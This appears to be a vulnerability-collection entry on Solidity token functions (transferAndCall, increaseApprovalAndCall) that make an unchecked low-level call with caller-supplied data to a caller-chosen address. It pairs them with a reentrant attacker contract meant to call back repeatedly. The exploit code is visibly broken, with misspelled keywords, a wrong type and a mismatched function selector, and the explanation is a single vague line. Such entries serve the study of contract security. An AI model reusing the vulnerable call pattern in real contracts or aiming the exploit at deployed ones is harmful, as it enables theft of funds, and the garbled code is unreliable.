## Vulnerable Code

```javascript
**Instance_1**
function transferAndCall(
        address _to,
        uint256 _value,
        bytes _data
    )
    public
    payable
    whenNotPaused
    returns (bool)
    {
        require(_to != address(this));

        super.transfer(_to, _value);

        // solium-disable-next-line security/no-call-value
        require(_to.call.value(msg.value)(_data));      //vulnerability position
        return true;
    }
    
    
**Instance_2**
function increaseApprovalAndCall(
        address _spender,
        uint _addedValue,
        bytes _data
        )
        public
        payable
        returns (bool)
        {
        require(_spender != address(this));

        increaseApproval(_spender, _addedValue);


        require(_spender.call.value(msg.value)(_data));  //different code

        return true;
}
```



## Exploit Code

```javascript
Contract Attack {
    uint count;
    address victimAddress;
    bytes  bs4 = new bytes(4);
    bytes4 functionSignature = bytes4(keccak256("startAttack()"));
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton startAttack(address _address) payable{
        for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
        count++;
        if(count < 5){
            victimAddress.call.value(10)(byte4(keccak256("transferAndCall(address , uint256,  bytes)")), this,  10, bs4);
        }
    }
}
```



##  Sophisticated Vulnerability Description
Look at the row "vulnerability position".The variable '_to' can be passed into any value by a malicious contract

